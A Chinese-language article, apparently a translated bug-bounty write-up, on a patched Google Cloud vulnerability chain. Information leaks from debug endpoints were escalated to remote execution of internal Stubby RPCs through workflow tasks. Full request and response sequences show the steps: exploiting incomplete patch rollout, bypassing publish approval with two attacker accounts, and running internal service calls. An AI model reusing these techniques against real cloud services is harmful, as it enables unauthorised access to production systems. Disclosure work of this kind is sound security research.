#  StubZero：谷歌云生产环境中的RCE漏洞  
原创 骨哥说事
                    骨哥说事  骨哥说事   2026-05-23 03:16  
  
<table><tbody><tr><td data-colwidth="557" width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;"><span leaf="">声明：</span></span></strong></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;"><span leaf="">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></span></h1></td></tr></tbody></table>#   
  
#   
  
****# 防走失：https://gugesay.com/  
  
**不想错过任何消息？设置星标****↓ ↓ ↓**  
#   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlbXyV4tJfwXpicwdZ2gTB6XtwoqRvbaCy3UgU1Upgn094oibelRBGyMs5GgicFKNkW1f62QPCwGwKxA/640?wx_fmt=png&from=appmsg "")  
  
这原本是一个调试端点信息泄露问题，最终升级为谷歌云生产环境中的完全远程代码执行。三个月后，它再次发生。该漏洞被分配为 **CVE-2026-2031**  
。  
  
故事始于我的一个自动化模糊测试工具，它提醒我注意 API **cloudcrmipfrontend-pa.googleapis.com**  
，因为它对一些可疑的端点返回了状态 200。经过进一步检查，这个 API 似乎有几个公开的调试端点：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/TKdPSwEibsZiagpFQJgbUn5zdNTjkHJEjkderOic9wcycLdxDR0eSvscIxxOXtTfgHRlqSFU4wlZ670ibMfNcrFEHjCszVteoExTBjIZJwUtmC8/640?wx_fmt=png&from=appmsg "")  
  
截图来自我为从 discovery document 测试谷歌内部 API 而构建的内部 API 浏览器工具  
### “即服务式” req2proto  
  
像 GET /v1/integrationPlatform:listServicesByServer  
 这样的端点似乎总是返回内部服务器错误。然而，端点 /v1/integrationPlatform:getProtoDefinition  
 似乎可以返回 **google3（谷歌内部源代码单仓库）中任意 protobuf 消息的原型定义**  
，甚至包括像 YouTube 这样不相关的服务。  
  
**请求**  
```
GET /v1/integrationPlatform:getProtoDefinition?fullName=youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext&isEnum=false HTTP/2Host: cloudcrmipfrontend-pa.clients6.google.comCookie: <已移除>Authorization: SAPISIDHASH <已移除>Origin: https://console.cloud.google.comX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
```  
> 对于此 API 的身份验证，我们使用的是谷歌专有的第一方身份验证。这涉及你的谷歌账户 cookie 头以及一个使用 SAPISID  
 cookie 和列入白名单的源 **https://console.cloud.google.com**  
计算出的 Authorization 头部值 。  
  
  
**响应**  
```
{  "protoDescriptor": {    "name": "InnerTubeContext",    "field": [      {        "name": "client",        "number": 1,        "label": "LABEL_OPTIONAL",        "type": "TYPE_MESSAGE",        "typeName": ".youtube.api.pfiinnertube.YoutubeApiInnertube.ClientInfo",        "jsonName": "client"      },      {        "name": "user",        "number": 3,        "label": "LABEL_OPTIONAL",        "type": "TYPE_MESSAGE",        "typeName": ".youtube.api.pfiinnertube.YoutubeApiInnertube.UserInfo",        "jsonName": "user"      },...
```  
  
这是巨大的发现，因为在谷歌，一切都基于原型 (proto) 。所有 API 在内部都定义为使用 Protocol Buffers (protobuf) 的 gRPC 服务，这本质上允许泄露任何端点的请求/响应体，对于像谷歌这样的黑盒目标来说，这简直是座金矿。  
  
过去，我曾为此开发过一个工具 req2proto ，但是该工具仅限于查找请求体的原型，不包括响应体，并且它假设 API 支持 JSPB (application/json+protobuf) ，而大多数 API 并不支持。作为一个玩笑，我和朋友们从那时起开始称这个端点为“即服务式 req2proto”，因为它实际上就是这个工具的托管版，且功能更强大。  
  
在进一步探测此端点之前，我检查了是否有其他泄露信息的端点。  
### 泄露内部工作流执行队列  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TKdPSwEibsZiaxLicgx9HTAdeTk3sia4fwLtS1pb1V5NoU0jaiaqymvmevnD6FrCachyTOBU5oxtXRDVXicpe7m0XSI9fmdWYl4ciaJY51zaA5ncOQ/640?wx_fmt=jpeg&from=appmsg "")  
  
最初，没有设置任何查询参数时，此端点只是返回 **INVALID_ARGUMENT**  
 错误。尝试像 *  
 这样的过滤器也不起作用。然而，根据以往经验，这些过滤参数通常允许按照 https://google.aip.dev/160 进行任何过滤。  
  
因此，尝试将 client_id > "123"  
 作为过滤器后，我得到了一个有趣的响应：  
```
{  "error": {    "code": 500,    "message": "Failed to convert server response to JSON",    "status": "INTERNAL"  }}
```  
  
看起来它试图给我的任何响应都没有 JSON 映射。然而，Google API 支持通过标准的 ?alt=  
 参数更改响应内容类型。例如，?alt=proto  
 将以 Protocol Buffers (protobuf) 格式返回输出。  
  
唯一的问题是，由于我们使用谷歌专有的第一方身份验证（Cookie 和 Authorization 头部）进行认证，我们必须向主机名 **cloudcrmipfrontend-pa.clients6.google.com**  
 发送请求，而不是 cloudcrmipfrontend-pa.googleapis.com  
，但是谷歌不允许发送到 *.google.com 的请求返回原始 protobuf 响应：  
```
Request unsafe for browser client domain: cloudcrmipfrontend-pa.clients6.google.com
```  
  
幸运的是，有办法解决这个问题。我们可以使用头部 X-Goog-Encode-Response-If-Executable: base64  
，这样就能以 base64 编码获取响应，而不是二进制数据：  
```
GET /v1/integrationPlatform:listQuotaQueue?filter=client_id%3E%22123%22&alt=proto HTTP/2Host: cloudcrmipfrontend-pa.clients6.google.comCookie: <已移除>Authorization: SAPISIDHASH <已移除>Origin: https://console.cloud.google.comX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYEX-Goog-Encode-Response-If-Executable: base64
```  
  
API 返回了一个很大的 base64 编码的 protobuf 响应。利用之前获取的原型定义泄露来检索 ListQuotaQueueResponse  
 的模式，我能够正确解码，结果显示这是某种内部工作流执行队列，其中包含将数据从 Spanner 同步到 Salesforce 的工作流：  
```
{  "queue_items": [    {      "queued_request": {        "queued_request_id": "75a885e2-c611-43f7-b4e2-ae0d87bae789",        "client_id": "default",        "workflow_name": "WriteToSfdc",        "priority": "CRITICAL",        "received_timestamp": 1763057385562,        "event_execution_info_id": "615cd9a9-9c0e-46ec-90df-91ee42ec9c37"      },      "event_execution_info": {        "client_id": "default",        "workflow_name": "WriteToSfdc",        "trigger_id": "api_trigger/WriteToSfdc",        ...        "type_url": "type.googleapis.com/enterprise.crm.datalayer.WriteToSfdcRequest",        ...        "sfdc_object": {          "vector_account": {            "id": "001Kf00000wjeK3IAI",            "due_diligence__c": "Pending",            "due_diligence_sub_status__c": "1. PENDING DD - Initial Submission Review"            ...
```  
  
这之后不久，我就这些漏洞提交了一份报告。仅仅几个小时后，它就被标记为 P0/S0 并获得了🎉 **Nice catch**  
！  
### 进一步升级？  
  
在这一切之后，我确信这个 API 中可能还有更多发现，于是我开始查看所有的工作流端点。该 API 似乎与谷歌云的 Application Integration 相关。  
  
它允许你定义一个“工作流 (workflow)”，你可以为其提供一个 triggerConfig  
 来指定触发条件，以及一个 taskConfig  
 来指定应触发的任务。最有趣的部分是，查看发现文档时，似乎暗示存在一个名为 GenericStubbyTypedTask  
 的任务，你似乎可以配置工作流来执行它，这立刻拉响了警报。  
```
"EnterpriseCrmEventbusProtoTaskUiModuleConfig": {"description": "Task author would use this type to configure a config module.","id": "EnterpriseCrmEventbusProtoTaskUiModuleConfig","properties": {    "moduleId": {      "description": "ID of the config module.",      "enum": [        ...        "RPC_TYPED",        ...      ],      "enumDescriptions": [        ...        "Configures a GenericStubbyTypedTask.",        ...      ],    }  }},
```  
  
根据 Google 的 SRE 书籍：  
> 谷歌的所有服务都使用名为 Stubby 的远程过程调用 (RPC) 基础设施进行通信；开源版本 gRPC 可用。通常，即使需要在本地程序中调用子例程，也会进行 RPC 调用。这使得在需要更多模块化或服务器代码库增长时，更容易将调用重构到不同的服务器中。  
  
  
根据我对工作原理的理解，Borg（即 Google 生产环境）遵循一个安全模型，其中每个 borgtask 服务都有自己的身份。当你向 *.googleapis.com  
 端点发送请求时，前端服务使用其自身的生产服务身份向后台服务发起 Stubby 调用，同时在安全凭证中携带你的最终用户上下文。如果凭证包含你的 Gaia 用户 ID，后台服务会以该用户身份授权该请求。以下是来自 Google API 错误响应的两个泄露的安全凭证示例：  
  
未经身份验证（匿名）  
```
com.google.apps.framework.auth.IamPermissionDeniedException:  IAM authority does not have the permission 'cloudprivatecatalog.targets.get'  required for action PrivateCatalogV1Beta1-SearchProducts  on resource ''.Explanation:Security Context:  ValidatedSecurityContextWithSystemAuthorizationPolicy    delegate = ValidatedSecurityContextWithRegistryHandle      delegate = ValidatedSecurityContextWithObligations        delegate = ValidatedIamSecurityContext          user  = anonymous          creds = EndUserCreds            loggable_credential {              type: SERVICE_CONTROL_TOKEN            }            access_assertion: ANONYMOUS          peer =            protocol                = loas            psp_version             = 0            level                   = strong_privacy_and_integrity            host                    = jxcbu6.prod.google.com            is_authenticated_host   = false            role                    = cloud-commerce-catalog            user                    = cloud-boq-clientapi-catalog            is_delegated            = true            jobname_chosen_by_user  = prod.cloud-commerce-catalog          InternalIAMIdentity            log = originator {              scope: MDB_USER              mdb_user {                user_name: "cloud-boq-clientapi-catalog"              }            }
```  
  
使用第一方身份验证（Gaia 用户）  
```
com.google.apps.framework.auth.IamPermissionDeniedException:  IAM authority does not have the permission 'resourcemanager.projects.get'  required for action GetServiceAccessStatus  on resource 'projects/613988253758'.Explanation:Security Context:  ValidatedSecurityContextWithCloudPolicyChecks    delegate = ValidatedSecurityContextWithCpeContext      delegate = ValidatedSecurityContextWithObligations        delegate = ValidatedSecurityContextWithRegistryHandle          delegate = ContextWithGaiaMintToken            delegate = ValidatedIamSecurityContext              user  = gaiauser/0xaa22527678              creds = EndUserCreds                loggable_credential {                  type: GAIA_MINT                  loggable_gaia_mint { }                }                loggable_credential {                  type: SERVICE_CONTROL_TOKEN                }              peer =                protocol                = loas                psp_version             = 0                level                   = strong_privacy_and_integrity                host                    = pjf8.prod.google.com                is_authenticated_host   = false                role                    = commerceorggovernance-clh                gaiaId                  = 640201889743                security_realm          = campus-dls                is_delegated            = false                borgcell                = pj                task_id                 = 2                user_type               = MDB_USER_NON_PERSON                jobname_chosen_by_user  = prod.commerceorggovernance-clh              InternalIAMIdentity                log = originator {                  scope: GAIA_USER                  gaia_user {                    user_id: 730720269944                  }                }
```  
  
两种情况下，peer  
 块都显示了发起内部 Stubby 调用的生产服务身份。区别在于最终用户上下文：第一个凭证是 ANONYMOUS  
，而第二个携带 GAIA_MINT  
 凭证（当你在谷歌使用 cookie 或 bearer 令牌认证时，它会被转换为包含嵌入式 GaiaMint 的标准 UberMint 令牌），意味着后台会以该 Gaia 用户身份授权请求。这是为了确保比如对 /ContactsService.ListContacts  
 的调用只返回该授权用户的联系人。  
  
如果我们能以集成平台的生产服务身份执行任意 Stubby 查询，这将使我们能够访问各种各样的 RPC，从敏感用户数据到代码执行，具体取决于生产用户的权限。因此，谷歌认为这极大地增加了攻击面，从而将其视为一次远程代码执行(RCE)。  
  
通常，即使你能在 borglet 中获得代码执行权，除非你特别关心本地处理了哪些数据，否则主要影响实际上是可以通过 Stubby RPC 访问所有生产环境。  
  
但是，什么机制实际限制了你能从被盗的 Stubby 原语中调用哪些  
RPC呢？Google 中的每个 Stubby 服务都有一个定义的 RpcSecurityPolicy  
，其中包含每个方法的允许列表。以下是一个来自 Cloud SQL Speckle Boss 进程的真实示例：  
```
mapping {rpc_method:"/SaasActuation.UpdateInstance"rpc_method:"/MaintenancePolicyService.CreateMaintenancePolicy"...authentication_policy{    creds_policy{      rules{        permissions:"auth.creds.useProdUserEUC"        action:ALLOW        in:"mdb:zamm-exe-3-cloud-sql--default-policy"        in:"user:speckle-tool-proxy@prod.google.com"      }      rules{        permissions:"auth.creds.useLOAS"        action:ALLOW        in:"allUsers"      }    }}authorization_mode:MANUAL_IAMpermission_to_check:"cloudsql.instances.rollout"}
```  
  
每个 mapping  
 块列出一组 RPC 方法，并声明哪些调用者被允许在哪种凭证类型下调用它们。根据我的理解，auth.creds.useLOAS  
 意味着“任何 borgtask 都可以使用其自身的 LOAS 身份调用此方法”，而 auth.creds.useProdUserEUC  
 意味着“只有这些特定的 MDB 组被允许将 Gaia 最终用户身份（即 UberMint 令牌）转发到调用中”。  
> LOAS（低开销认证系统）是 Google 的内部认证与加密框架，更多信息请参见这篇论文  
  
  
permission_to_check  
 然后告诉后台对最终解析出的任何身份强制执行哪个 IAM 权限。  
  
因此，即使拥有被盗的 Stubby 原语，你实际上也无法调用所有 RPC。你只能访问那些 RpcSecurityPolicy  
 允许你的对等身份通过的 RPC。尽管如此，这仍然是可到达攻击面的大幅增加。  
  
当我最初尝试创建工作流时，我遇到了以下 **INVALID_ARGUMENT**  
 错误：  
  
**请求**  
```
POST /v1/integrationPlatform:createDraftWorkflow HTTP/2Host: cloudcrmipfrontend-pa.clients6.google.comCookie: <已移除>Authorization: SAPISIDHASH <已移除>Origin: https://console.cloud.google.comX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYEContent-Type: application/jsonContent-Length: 197{  "workflow": {    "name": "my-new-workflow-test",    "origin": "UI",    "triggerConfigs": [],    "taskConfigs": []  },  "isNewWorkflow": true}
```  
  
**响应**  
```
{  "error": {    "code": 400,    "message": "Request contains an invalid argument.",    "status": "INVALID_ARGUMENT"  }}
```  
> 有趣的事实：如果这个请求是从谷歌内网内部发送的，它会转储完整的堆栈跟踪，而不是像这样只给出一个通用错误。  
  
  
我怀疑我可能缺少一个必需的参数，很可能是 **clientId**  
。记起之前从 listQuotaQueue 响应中泄露了 "client_id": "default"  
，我尝试将其设置为 clientId  
，结果成功了：  
  
**请求**  
```
POST /v1/integrationPlatform:createDraftWorkflow HTTP/2Host: cloudcrmipfrontend-pa.clients6.google.comCookie: <已移除>Authorization: SAPISIDHASH <已移除>Origin: https://console.cloud.google.comX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYEContent-Type: application/jsonContent-Length: 197{  "workflow": {    "name": "my-new-workflow-test",    "origin": "UI",    "clientId": "default",    "triggerConfigs": [],    "taskConfigs": []  },  "isNewWorkflow": true}
```  
  
**响应:**  
```
{  "workflow": {    "workflowId": "53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e",    "name": "my-new-workflow-test",    "origin": "UI",    "creatorEmail": "admin@gvrptest.cry.dev",    "createdTime": "2025-12-01T04:19:14.449503Z",    "lastModifiedTime": "2025-12-01T04:19:14.449503Z",    "status": "DRAFT",    "snapshotNumber": "1",    "tags": [      "HEAD"    ],    "lockedBy": "admin@gvrptest.cry.dev",    "lockedAtTime": "2025-12-01T04:19:14.449503Z",    "lastModifierEmail": "admin@gvrptest.cry.dev",    "clientId": "default"  }}
```  
  
然而，为了运行工作流，似乎必须先发布它，但我在这里卡住了：  
  
**请求**  
```
POST /v1/integrationPlatform:publishWorkflow HTTP/2Host: cloudcrmipfrontend-pa.clients6.google.comCookie: <已移除>Authorization: SAPISIDHASH <已移除>Origin: https://console.cloud.google.comX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYEContent-Type: application/json{  "workflowId": "53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e"}
```  
  
**响应**  
```
{  "error": {    "code": 403,    "message": "Publisher admin@gvrptest.cry.dev cannot be the same as the last editor admin@gvrptest.cry.dev of the integration my-new-workflow-test with snapshot number 1 and integration ID 53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e being edited from the UI. Please raise a Request to Publish and have your change approved by another person.",    "status": "PERMISSION_DENIED"  }}
```  
  
我必须想办法向工作流添加另一个用户，并使用该账户来发布。当时，我尝试使用 ACL 端点来添加另一个账户，但无法使权限正常工作。  
### 改变一切的 Discord 私信  
  
在我最初报告一个多月后，我在一个 Discord 群聊中与其他几位研究人员交流，当时我开玩笑地提到我有一个能泄露谷歌内部 Protobuf 定义的漏洞：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TKdPSwEibsZjgV0hNaOEaIETtP1Oibs45UtKZib6xK2pYass01hibuNa33FLaApjb2MX4XthNCce4QUEpibhPdpYjTBfxM15rsS8JeMt8t0K2GIU/640?wx_fmt=jpeg&from=appmsg "")  
  
这时，shrugged 提到他也有同样的漏洞，我们的对话就此展开。  
  
结果发现，shrugged 也在调查同一个 API，当时他正在研究另一个漏洞，注意到这些端点列在 Application Integration 的 JavaScript 文件中。他已经发现 GenericStubbyTypedTask  
 是一个潜在的 RCE 攻击向量，但因为没有有效的 client_id  
 来初始创建工作流草稿而卡住了。  
  
与此同时，我有从配额队列泄露中得到的 client_id  
，但在发布步骤卡住了。我们迅速交换了信息：我分享了 client_id: "default"  
 以及我遇到的障碍，然后我们从那里继续。  
  
谷歌已经针对我的初始报告实施了修复，因此许多原始端点现在都返回 PERMISSION_DENIED。然而，我们注意到一些有趣的现象——许多端点在**不同的服务名称下**  
有 1：1 工作的对应端点：  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;min-width: 85px;"><section><span leaf="">原始（已屏蔽）</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;min-width: 85px;"><section><span leaf="">对应端点</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;min-width: 85px;"><section><span leaf="">/v1/integrationPlatform:getProtoDefinition</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;min-width: 85px;"><section><span leaf="">/v1/integrationPlatform/workflowsupport:getProtoDefinition</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;min-width: 85px;"><section><span leaf="">/v1/integrationPlatform:runWorkflow</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;min-width: 85px;"><section><span leaf="">/v1/integrationPlatform/workflowexecution:runWorkflow</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;min-width: 85px;"><section><span leaf="">/v1/integrationPlatform:setAcl</span></section></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;min-width: 85px;"><section><span leaf="">/v1/integrationPlatform/auth:setAcl</span></section></td></tr></tbody></table>  
  
最初的修复只屏蔽了原始的“WorkflowEditorService”端点，但没有屏蔽这些对应端点。问题是 createDraftWorkflow  
——我们找不到它的对应端点，它返回 PERMISSION_DENIED：  
```
{  "error": {    "code": 403,    "message": "The caller does not have permission",    "status": "PERMISSION_DENIED"  }}
```  
  
奇怪的是，当 shrugged 尝试同样的请求时，他的第一次尝试就成功了，而我却一直得到 PERMISSION\_DENIED  
。这时我们意识到：修复还没有完全传播到所有负载均衡的后端。通过重复发送相同的请求，我们可以可靠地路由到一个仍然允许通过的**后端**  
：  
```
HTTP/2 200 OKContent-Type: application/json; charset=UTF-8{ "workflow": { "workflowId": "c6141c63-ac7a-4350-b582-7615ef045d0c", "name": "retest", "origin": "UI", "creatorEmail": "admin@gvrptest.cry.dev", "createdTime": "...", "lastModifiedTime": "...", "status": "DRAFT", "snapshotNumber": "1", "tags": [ "HEAD" ], "lockedBy": "admin@gvrptest.cry.dev", "lockedAtTime": "...", "lastModifierEmail": "admin@gvrptest.cry.dev", "clientId": "default" } }
```  
  
然而，任务名称 GenericStubbyTypedTask 似乎不存在。查看 /v1/integrationPlatform:listTaskEntities  
 的响应（使用来自 getProtoDefinition 的原型定义解码），它似乎只提供带有 IO_TEMPLATE  
 的任务：  
```
{  "taskEntities": [    {      "metadata": {        "name": "Delete SFDC Record",        "descriptiveName": "Delete Salesforce Record",        "description": "Deletes a record in Salesforce",        "g3DocLink": "https://g3doc.corp.google.com/company/teams/cloudcrm/platform/user_guide/tasks/write_to_sfdc.md#delete-sfdc-record-task",        "iconLink": "https://gstatic.com/enterprise/crm/eventbus/images/icons/blue/salesforce_009EDB_48px_1_blue.svg",        "codeSearchLink": "https://cs.corp.google.com/piper///depot/google3/java/com/google/enterprise/crm/eventbus/connectors/generic/impl/GenericRestV2TaskImpl.java",      ...      },      "paramSpecs": {        "parameters": [          {            "key": "salesforceDomain",            "dataType": "STRING_VALUE",            "className": "java.lang.String",            "config": {              "descriptivePhrase": "Check in Salesforce: Setup > Company Settings > My Domain. If you don't have My Domain enabled, please use \"yourinstance.salesforce.com\" as the Salesforce domain.",              "label": "Salesforce domain",              "uiPlaceholderText": "e.g. yourDomain.my.salesforce.com"            },            "required": 1          },        ...        ]      },      ...      "taskType": "IO_TEMPLATE"    },    ...  ]}
```  
  
看起来 GenericStubbyTypedTask 很可能属于底层 ASIS_TEMPLATE  
：  
```
{  "taskType": {      "description": "Defines the type of the task",      "enum": [        "TASK",        "ASIS_TEMPLATE",        "IO_TEMPLATE"      ],      "enumDescriptions": [        "Normal IP task",        "Task is of As-Is Template type",        "Task is of I/O template type with a different underlying task"      ],      "type": "string"  }}
```  
  
有趣的是，这个端点的底层 RPC 是 google.internal.cloud.crm.ipfrontend.v1.WorkflowEditorService/ListTaskEntities  
。这与公开的 Application Integration 产品的 /$rpc/google.cloud.integrations.v1alpha.Integrations/ListTaskEntities  
 惊人地相似，尽管那个端点也没有直接返回任何 ASIS_TEMPLATE  
 任务。  
  
回顾 Application Integration 的 JS 代码 来自 Cloud Console：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TKdPSwEibsZghEK4RdgYTibsSoC09uPyHKGZgKnQXBmc12C1ga5fF9UzHDZxk464N3vBCOILqNEP2S9FniapNvhiagFvL85cZ4ciah7fEy3bKRvs/640?wx_fmt=jpeg&from=appmsg "")  
```
["Vertex AI - Predict","https://www.gstatic.com/enterprise/crm/eventbus/images/icons/custom_tasks/document_ai.png"],["GenericStubbyTypedTaskV2","http://gstatic.com/enterprise/crm/eventbus/images/icons/blue/stubby_48px_blue.svg"],["RunGoogleSqlPlxQueryTask","https://fonts.gstatic.com/s/i/productlogos/plx/v6/192px.svg"],["ConvertDremelResultToJsonTask","https://www.gstatic.com/images/icons/material/system/2x/settings_googblue_24dp.png"],
```  
  
确切的**任务名称**  
是 **GenericStubbyTypedTaskV2**  
，甚至还有自己的图标：![](https://mmbiz.qpic.cn/mmbiz_svg/Q3auHgzwzM7bBg5GZERrCMx1icqCP47FhjlWuCoeZbqANaLVPDNzvq0YPuK2GEjzH3xqsFRaalPibtRW4JMjzu5tia0db4XTyTxxwJ3vgcbRWrQy4qibwcCr8g/640?wx_fmt=svg&from=appmsg "")  
  
  
尝试在 Application Integration 上配置 GenericStubbyTypedTask  
 返回了一个错误，揭示了必需的字段：  
```
{  "error": {    "code": 400,    "message": "'Required input key serverSpec not present in task GenericStubbyTypedTaskImpl, task number 1.'",    "status": "INVALID_ARGUMENT"  }}
```  
  
对每个缺失的键重复尝试，揭示了 **serverSpec**  
、**serviceName**  
 和 **serviceMethod**  
 字段。相同的参数也适用于 GenericStubbyTypedTaskV2  
。使用 Ezequiel Pereira 的 protobuf 仓库 作为参考，以及我们在另一个发现文档中发现的泄露的 GSLB 地址，我们将任务配置为在 **gslb:alkali-base**  
 上调用 /ServerStatus.GetServices  
：  
> 有趣的事实：Alkali 是谷歌的内部框架，员工可以用它来启动生产 API，只需最少的样板代码，但它们往往存在很多安全问题。  
  
```
HTTP/2 200 OKContent-Type: application/json; charset=UTF-8{"workflow": {"workflowId": "f91833bf-eacb-43ac-8490-099fef977e19", "name": "retest-test123", "taskConfigs": [{"taskName": "GenericStubbyTypedTaskV2", "taskNumber": "1", "parameters": {"response": {"key": "response", "value": {"stringValue": "$response$"}, "dataType": "STRING_VALUE"}, "serverSpec": {"key": "serverSpec", "value": {"stringValue": "gslb:alkali-base"}, "dataType": "STRING_VALUE"}, "serviceName": {"key": "serviceName", "value": {"stringValue": "ServerStatus"}, "dataType": "STRING_VALUE"}, "serviceMethod": {"key": "serviceMethod", "value": {"stringValue": "GetServices"}, "dataType": "STRING_VALUE"}}, "position": {"x": -716, "y": -445}, "label": "Stubby Internal", "incomingEdgeCount": 1, "taskType": "ASIS_TEMPLATE", "externalTaskType": "NORMAL_TASK"}], "triggerConfigs": [{"startTasks": [{"taskNumber": "1"}], "properties": {"Trigger name": "my-api-trigger-123"}, "triggerType": "API", "triggerNumber": "1", "enabledClients": ["default"], "triggerId": "api_trigger/my-api-trigger-123"}], "origin": "UI", "creatorEmail": "<REDACTED>", "createdTime": "2026-01-12T09:45:55.896951Z", "lastModifiedTime": "2026-01-12T09:45:55.896951Z", "status": "DRAFT", "snapshotNumber": "1", "tags": ["HEAD"], "lockedBy": "<REDACTED>", "lockedAtTime": "2026-01-12T09:45:55.896951Z", "lastModifierEmail": "<REDACTED>", "clientId": "default"}}
```  
  
这里的一切都与 Application Integration**惊人地相似**  
——工作流结构、任务配置，甚至发布和运行的流程。注意我们工作流中的 "position": {"x": -716, "y": -445}  
 吗？内部 UI 很可能看起来很像 Application Integration 的**可视化工作流编辑器**  
，我们实际上是在为任务位置设置坐标：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/TKdPSwEibsZiaJJhcPnHJFd86UyUSz8gjwiciaUvRQia7lEFKbc18UdH1G5GwZicHjdJHnrIVYOp8zicKsm3Odbibl8MAmA0CacJq73rZ3Nib3iaUkkAw/640?wx_fmt=jpeg&from=appmsg "")  
  
还记得之前阻止我发布的 ACL 问题吗？shrugged 发现我们可以通过使用两个攻击者控制的谷歌账户的混淆后 Gaia ID，为 IP_EVENTBUS_WORKFLOWS  
 更新 ACL 来绕过它。  
  
**请求**  
```
POST /v1/integrationPlatform/auth:setAcl HTTP/2Host: cloudcrmipfrontend-pa.clients6.google.comCookie: <已移除>Authorization: <已移除>Origin: https://console.cloud.google.comX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYEContent-Type: application/jsonContent-Length: 500{"resourceInfo": {"resource": "IP_EVENTBUS_WORKFLOWS", "id": "retest-test123"}, "acl": {"entries": [{"scope": {"obfuscatedGaiaId": "100029910836469267942"}, "role": 105}, {"scope": {"obfuscatedGaiaId": "113728935872649341310"}, "role": 105}]}}
```  
  
**响应**  
```
HTTP/2 200 OKContent-Type: application/json; charset=UTF-8{}
```  
  
首先，我们使用第一个攻击者谷歌账户切换请求以发布工作流：  
```
POST /v1/integrationPlatform/workflowdeployment:toggleRequestToPublishWorkflow HTTP/2Host: cloudcrmipfrontend-pa.clients6.google.com...{"workflowId": "f91833bf-eacb-43ac-8490-099fef977e19"}
```  
  
然后，最终使用第二个攻击者账户发布工作流：  
```
POST /v1/integrationPlatform/workflowdeployment:publishWorkflow HTTP/2Host: cloudcrmipfrontend-pa.clients6.google.com...{"workflowId": "f91833bf-eacb-43ac-8490-099fef977e19"}
```  
  
运行一个配置了 GenericStubbyTypedTaskV2  
 的工作流，其中 serverSpec  
 设置为 gslb:alkali-base  
，服务和方法的参数设置为 /ServerStatus.GetServices  
，我们能够**执行 Stubby 查询**  
：  
```
...{    "protoValue": {    "@type": "type.googleapis.com/rpc.ServiceList",    "service": [        {        "name": "AlkaliBaseAccountService",        "descriptor": {            "filename": "google/internal/alkali/base/v1/alkali_base_account_service.proto",            "name": "AlkaliBaseAccountService",            "method": [            {                "name": "ListAccounts",                "argumentType": "google.internal.alkali.base.v1.ListAccountsRequest",                "resultType": "google.internal.alkali.base.v1.ListAccountsResponse",                "deadline": 30,                "securityLevel": "none"            },            {                "name": "ListAccessibleAccounts",                "argumentType": "google.internal.alkali.base.v1.ListAccessibleAccountsRequest",                "resultType": "google.internal.alkali.base.v1.ListAccountsResponse",                "deadline": 30,                "securityLevel": "none"            },            ...
```  
  
然后，我们更新了初始漏洞报告，增加了升级到 RCE 的信息。我们俩单凭一己之力都无法完成这件事，而且时机非常关键：就在我们提交概念验证的一个小时后，针对 createDraftWorkflow  
 的修复就**完全传播**  
了。再晚一点，这个 RCE 升级就只会停留在理论层面了。也就是说，在我们真正能在谷歌服务器上执行代码之前，我们就**被谷歌切断了访问**  
。  
### 时间线（第一次 RCE）  
- 2025-12-01 - 向谷歌发送初始报告  
  
- 2025-12-01 - 谷歌将报告分类为 P0/S0  
  
- 2025-12-01 - 🎉 **Nice catch!**  
  
- 2026-01-12 - 通知谷歌安全团队关于 RCE 升级  
  
- 2026-01-12 - 用 RCE 概念验证 (PoC) 更新报告  
  
- 2026-01-12 - 报告被谷歌升级  
  
- 2026-01-16 - **评审小组奖励 60,000 美元**  
